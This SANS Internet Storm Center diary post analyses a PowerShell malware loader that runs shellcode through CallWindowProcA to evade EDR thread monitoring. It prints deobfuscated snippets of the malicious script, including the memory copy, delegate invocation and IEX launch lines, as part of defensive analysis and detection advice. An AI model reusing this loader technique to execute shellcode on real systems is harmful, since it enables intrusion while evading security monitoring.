---
title: Interesting Technique to Launch a Shellcode, (Wed, Aug 27th)
url: https://isc.sans.edu/diary/rss/32238
source: SANS Internet Storm Center, InfoCON: green
date: 2025-08-28
fetch_date: 2025-10-07T00:50:16.968955
---

# Interesting Technique to Launch a Shellcode, (Wed, Aug 27th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/32234)
* [next](/diary/32242)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Interesting Technique to Launch a Shellcode](/forums/diary/Interesting%2BTechnique%2Bto%2BLaunch%2Ba%2BShellcode/32238/)

**Published**: 2025-08-27. **Last Updated**: 2025-08-27 05:55:21 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Interesting%2BTechnique%2Bto%2BLaunch%2Ba%2BShellcode/32238/#comments)

In most attack scenarios, attackers have to perform a crucial operation: to load a shellcode in memory and execute it. This is often performed in a three-step process:

1. Some memory must be allocated and flagged as "executable" with VirtualAlloc() (and sometimes combined with VirtualProtect())
2. The shellcode (often deobfuscated) is copied into this newly allocated memory region with a call to move() or alternatives
3. The shellcode is launched using the creation of a new thread.

With this technique, the shellcode will be executed in the context of the current process, but alternative techniques might, of course, load and execute the shellcode in a remote process.

This technique is pretty well flagged by most EDRs.That's why Attackers are always looking for alternative ways to execute malicious code and defeat EDRs. I found a nice piece of PowerShell that implements such a technique!

The PowerShell script is dropped by a Windows executable (SHA256:ec8ec8b3234ceeefbf74b2dc4914d5d6f7685655f6f33f2226e2a1d80e7ad488)[[1](https://www.virustotal.com/gui/file/ec8ec8b3234ceeefbf74b2dc4914d5d6f7685655f6f33f2226e2a1d80e7ad488/detection)]. It dumps many files, but two of them are interesting:

```

C:\Users\REM\AppData\Roaming\Cafeterias108\butikscenters\Nonrepentance\menneskevrdige.Paa
C:\Users\REM\AppData\Roaming\Cafeterias108\butikscenters\Skydeprammenes\Bogskrivninger70.Mde
```

Then it launches the following command line:

```

"powershell.exe" -windowstyle minimized "$microcolorimetric=gc -Raw 'C:\Users\REM\AppData\Roaming\Cafeterias108\butikscenters\Skydeprammenes\Bogskrivninger70.Mde';$Hosiomartyr=$microcolorimetric.SubString(52695,3);
```

Let's check the substring extracted by PowerShell:

```

remnux@remnux:~/malwarezoo/20250825$ cut-bytes.py -d 52695:3l Bogskrivninger70.Mde
Iex
```

IEX (or "Invoke-Expression") is never good news in PowerShell scripts!

The file Bogskrivninger70.Mde is pretty well obfuscated:

![](https://isc.sans.edu/diaryimages/images/isc-20250827-1.png)
The most interesting function is this one:

![](https://isc.sans.edu/diaryimages/images/isc-20250827-2.png)

vrvlenes() will deobfuscate strings and, if the second parameter is set to a non-zero value, execute the deobfuscated string with IEX. I decoded all of them, and the following ones give a good understanding of the script.

First, we have calls to VirtualAlloc():

```

$global:integrity = $geparders.Invoke(0, 7119, $heterographical, $direktrstolene)
$global:autorisationens = $geparders.Invoke(0, 53846016, $heterographical, $krablende)
```

The second file (see above) is read:

```

$snatchy="$env:APPDATA\Cafeterias108\butikscenters\Nonrepentance\menneskevrdige.Paa"
$global:ventose = [System.IO.File]::ReadAllBytes($snatchy)
```

The shell code is extracted at offset 2048 (size 7119 bytes) and copied to the address returned by the first call to VirtualAlloc():

```

[System.Runtime.InteropServices.Marshal]::Copy($ventose, 2048,  $integrity, 7119)
```

A second payload is extracted and copied into the second memory region:

```

[System.Runtime.InteropServices.Marshal]::Copy($ventose, 7119+2048, $autorisationens, $revalideringscenteret36)
```

And now the magic will happen. The interesting variables are:

* $gttes = "User32"
* $thars = "CallWindowProcA":

```

$global:saarskorpers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((endothorax $gttes $tahrs), (calumniators @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))
$saarskorpers.Invoke($integrity,$autorisationens,$flagres,0,0)
```

I executed this script in the PowerShell ISE debugger to control it. Once the first memory allocation has been performed, let's attach a debugger to the PowerShell process:

```

$global:integrity = $geparders.Invoke(0, 7119, $heterographical, $direktrstolene)
[DBG]: PS C:\Users\REM>> $integrity
2156785106944
```

That's where the new memory has been allocated (in hex 0x1F62A690000) and where the shellcode will be loaded. You can see that the memory has been zeroed (freshly allocated) and is ready to receive some data. Let's create a hardware breakpoint on this location:

![](https://isc.sans.edu/diaryimages/images/isc-20250827-3.png)

In the deobfuscated strings, there is an interesting API call: CallWindowProc(). Let's create another breakpoint on it. Once reached, you can see the address of the shellcode passed as the first argument:

![](https://isc.sans.edu/diaryimages/images/isc-20250827-4.png)
Let's allow PowerShell to invoke CallWindowProcA(), and we get the hardware breakpoint at the beginning of the shellcode:

![](https://isc.sans.edu/diaryimages/images/isc-20250827-5.png)
Bad news, the shellcode crashed on my system...

Let's focus on the API call CallWindowProc()[[2](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callwindowprocw)]. It is a Win32 GUI API that invokes a window procedure. You give it a function pointer; it calls that pointer with four arguments and returns the result. As usual, this API call is not malicious and can be very useful to developers to extend the capabilities of their GUI. For example, tools like screen readers, hotkey managers) can use this API call to monitor window messages.

Attackers can decide to use it because:

* It executes code!
* It accepts any function pointer and blindly executes it.
* No new thread is needed! Many EDRs monitor CreateThread/NtCreateThreadEx. Here, execution happens on the existing GUI thread.
* Looks “normal” for GUI apps. Calling window procedures and dispatching messages is standard GUI behavior, so this can blend in with benign activity.

 Conclusion: Attackers always find ways to operate below the radar with "exotic" API calls. CallWindowProc() is a new one to keep an eye on!

[1] <https://www.virustotal.com/gui/file/ec8ec8b3234ceeefbf74b2dc4914d5d6f7685655f6f33f2226e2a1d80e7ad488/detection>
[2] <https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callwindowprocw>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [API](/tag.html?tag=API) [CallWindowProc](/tag.html?tag=CallWindowProc) [Injection](/tag.html?tag=Injection) [Malware](/tag.html?tag=Malware) [PowerShell](/tag.html?tag=PowerShell) [Shellcode](/tag.html?tag=Shellcode)

[0 comment(s)](/diary/Interesting%2BTechnique%2Bto%2BLaunch%2Ba%2BShellcode/32238/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/32234)
* [next](/diary/32242)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [J...